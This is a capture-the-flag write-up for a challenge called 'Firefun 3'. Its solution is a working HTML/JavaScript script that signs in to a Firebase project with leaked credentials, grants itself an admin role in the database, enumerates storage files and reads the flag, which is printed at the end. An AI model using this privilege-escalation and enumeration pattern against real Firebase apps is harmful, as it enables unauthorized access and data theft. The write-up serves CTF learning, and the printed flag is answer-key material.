# Firefun 3

Solved by: @vicevirus

## Question:
Our fireplace company was all set to take off for the moon, then we had to shut it all down. All that's left is a simple landing page.


## Solution:
```
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Firebase App</title>
</head>
<body>

	<!-- Import Firebase app and modules -->
	<script type="module">
		// Import Firebase modules
		import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
		import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";
		import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
		import { getStorage, ref as storageRef, listAll, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js";

		// Firebase configuration
		const firebaseConfig = {
			apiKey: "--removed--",
			authDomain: "udctf24.firebaseapp.com",
			databaseURL: "https://udctf24-default-rtdb.firebaseio.com",
			projectId: "udctf24",
			storageBucket: "udctf24.firebasestorage.app",
			messagingSenderId: "926833250426"
		};

		// Initialize Firebase
		const app = initializeApp(firebaseConfig);
		const auth = getAuth(app);
		const database = getDatabase(app);
		const storage = getStorage(app);

		// Function to add admin role and attempt to read the flag
		async function checkAdminAndReadFlag(uid) {
			try {
				// Attempt to add the admin role to the user's profile
				await set(ref(database, `users/${uid}/roles/admin`), true);
				console.log("Admin role added!");

				// Attempt to read the flag
				const flagSnapshot = await get(ref(database, "flag"));
				if (flagSnapshot.exists()) {
					console.log("Flag:", flagSnapshot.val());
				} else {
					console.log("No flag found or access denied.");
				}
			} catch (error) {
				console.error("Error while adding admin role or reading flag:", error.message);
			}
		}

		// Function to enumerate storage files
		async function checkStorage() {
			const rootRef = storageRef(storage, '/');  // Root directory reference
			try {
				const result = await listAll(rootRef);
				result.items.forEach(async (itemRef) => {
					console.log("File found:", itemRef.fullPath);
					// Get download URL for each file
					const url = await getDownloadURL(itemRef);
					console.log("Download URL:", url);
				});
			} catch (error) {
				console.error("Error listing storage files:", error);
			}
		}

		// Attempt email and password login, then check storage and database if successful
		signInWithEmailAndPassword(auth, "avi--removed--ank@gmail.com", "--removed--")
			.then((userCredential) => {
				const uid = userCredential.user.uid;
				console.log("User signed in:", uid);

				// Check storage for files
				checkStorage();

				// Attempt to add admin role and read flag
				checkAdminAndReadFlag(uid);
			})
			.catch((error) => {
				console.error("Error with email/password sign-in:", error.code, error.message);
			});

		console.log("App Name:", app.name);
	</script>

</body>
</html>
```

**Flag:`udctf{wh4t_4_sleuth_y0u_4r3!}`** 
